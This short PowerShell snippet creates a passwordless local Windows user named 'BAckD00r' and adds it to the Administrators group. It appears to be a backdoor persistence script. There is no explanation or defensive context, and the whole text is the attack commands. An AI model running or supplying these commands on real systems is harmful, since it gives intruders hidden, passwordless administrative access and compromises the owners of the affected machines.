New-LocalUser -Name "BAckD00r" -NoPassword
Add-LocalGroupMember -Group "Local" -Member "BAckD00r"
Add-LocalGroupMember -Group "Administrators" -Member "BAckD00r"